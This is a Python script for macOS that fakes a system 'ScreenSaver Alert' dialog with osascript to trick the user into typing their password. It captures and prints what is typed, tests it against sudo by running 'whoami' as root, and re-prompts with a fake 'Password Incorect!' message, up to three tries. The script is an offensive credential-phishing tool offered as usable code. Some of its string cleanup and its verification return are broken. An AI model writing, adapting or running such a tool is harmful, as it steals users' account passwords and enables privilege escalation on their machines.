#!/usr/bin/env python
# This Python file uses the following encoding: utf-8
import subprocess
import time
import sys

def myrun(cmd):
    """from http://blog.kagesenshi.org/2008/02/teeing-python-subprocesspopen-output.html"""
    p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    stdout = []
    while True:
        line = p.stdout.readline()
        stdout.append(line)
        if line == '' and p.poll() != None:
            break
    return ''.join(stdout)

def whoami():
    # do this to ensure keychain is locked
    subprocess.Popen('whoami', stdout=subprocess.PIPE, shell=True)



def retrypassword():
    process = subprocess.Popen("""osascript -e  'tell app "ScreenSaverEngine" to activate' -e 'tell app "ScreenSaverEngine" to display dialog "ScreenSaver requires your password to continue. Password Incorect!" & return  default answer "" with icon 1 with hidden answer with title "ScreenSaver Alert"'""", stdout=subprocess.PIPE, shell=True)
    text = process.communicate()
    return text[0]

def parse(text):
    text = text.split(':')
    password = text[-1]
    password.rstrip('\\n')
    password.rstrip('\\r')
    password.replace('!','%%21')
    password.replace('#','%%23')
    password.replace('$','%%24')
    return password
    
def verify(password):
     print str(password)
     sudo_password = str(password)
     command = 'whoami'.split()

     process = subprocess.Popen(['sudo', '-S'] + command, stdin=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
     sudo_prompt = process.communicate(sudo_password + '\n')[1]
     
     #print "Output is " + sudo_prompt
     #return process.communicate()
     #if "root" == sudo_prompt.strip():
        #return True
     #else:
        #return False
    

def run(exitCount):
    try:
        print "Starting"
        process = subprocess.Popen("""osascript -e  'tell app "ScreenSaverEngine" to activate' -e 'tell app "ScreenSaverEngine" to display dialog "ScreenSaver requires your password to continue." & return  default answer "" with icon 1 with hidden answer with title "ScreenSaver Alert"'""", stdout=subprocess.PIPE, shell=True)
        text = process.communicate()
        text = text[0]
        count = 0
        while True:
            if exitCount:
                count += 1
                if count > exitCount:
                    break
            if 'button returned:OK, text returned:' in text:
                password = parse(text)
                print "First Password is " + str(password)
                if password:
                    whoami()
                    # try to get first password
                    correct = verify(password)
                    if correct:
                        # we found the right password!
                        print "Password is working " + str(password)
                        break
                    else:
                        print "Mauvais mot de passe " + str(password)
                        text = retrypassword()
            else:
                text = retrypassword()
    except Exception as e:
        print e

        
exitCount = 3
run(exitCount)
